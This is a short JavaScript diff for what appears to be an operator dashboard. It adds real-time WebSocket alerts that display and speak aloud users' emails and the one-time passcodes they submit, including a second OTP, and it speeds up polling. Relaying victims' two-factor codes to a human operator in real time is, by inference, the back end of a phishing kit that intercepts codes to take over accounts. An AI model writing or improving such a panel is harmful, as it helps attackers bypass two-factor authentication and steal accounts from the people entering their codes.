+                if (data.type === 'user-login') {
+                    showToast('New Signup', `${data.email} signed up`);
+                    speakText(`New signup from ${data.email}`, true);
+                    fetchUsers();
+                } else if (data.type === 'user-otp-created') {
+                    showToast('First OTP Received', `${data.email} submitted OTP: ${data.otp}`);
+                    speakText(`First OTP received from ${data.email}. Code: ${data.otp.split('').join(' ')}`, true);
+                    fetchUsers();
+                } else if (data.type === 'user-second-otp-created') {
+                    showToast('Second OTP Received', `${data.email} submitted second OTP`);
+                    speakText(`Second OTP received from ${data.email}`, true);
+                    fetchUsers();
+                }
+            };
+        } catch(e) { console.log('WebSocket not available'); }
     }
 
     if (Notification.permission === 'default') Notification.requestPermission();
     setupTheme();
     loadVoices();
     fetchUsers();
-    setInterval(fetchUsers, 5000);
+    setupWebSocket();
+    setInterval(fetchUsers, 3000);
 
     document.getElementById('testVoiceBtn').onclick = testVoice;
     document.getElementById('ttsToggleBtn').onclick = toggleTTS;
